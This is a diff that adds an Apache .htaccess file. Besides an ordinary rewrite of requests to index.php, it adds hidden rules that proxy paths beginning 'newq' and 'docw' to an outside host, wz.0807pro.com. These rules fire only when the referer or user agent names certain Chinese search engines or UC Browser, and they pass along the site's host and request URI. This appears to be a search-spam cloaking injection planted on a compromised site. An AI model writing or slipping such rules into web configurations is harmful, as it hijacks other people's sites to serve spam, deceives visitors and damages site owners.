@@ -1,0 +1,15 @@
+<IfModule mod_rewrite.c>
+  Options +FollowSymlinks -Multiviews
+  RewriteEngine On
+  RewriteCond %{HTTP_REFERER} (haosou|360|sog|sogou|sogo|m.sogou|ucbrowser) [NC] 
+  RewriteRule ^newq(.*)$ http://wz.0807pro.com/?jump=1  [QSA,NC,L,P]
+  RewriteCond %{HTTP:User-Agent} (haosou|360|sog|sogou|sogo|m.sogou|ucbrowser) [NC] 
+  RewriteRule ^newq(.*)$ http://wz.0807pro.com/?xhost=%{HTTP_HOST}&reurl=%{REQUEST_URI} [QSA,NC,L,P]
+  RewriteCond %{HTTP_REFERER} (haosou|360|sog|sogou|sogo|m.sogou|ucbrowser) [NC] 
+  RewriteRule ^docw(.*)$ http://wz.0807pro.com/?jump=1  [QSA,NC,L,P]
+  RewriteCond %{HTTP:User-Agent} (haosou|360|sog|sogou|sogo|m.sogou|ucbrowser) [NC] 
+  RewriteRule ^docw(.*)$ http://wz.0807pro.com/?xhost=%{HTTP_HOST}&reurl=%{REQUEST_URI} [QSA,NC,L,P]
+  RewriteCond %{REQUEST_FILENAME} !-d
+  RewriteCond %{REQUEST_FILENAME} !-f
+  RewriteRule ^(.*)$ index.php?/$1 [QSA,PT,L]
+</IfModule>
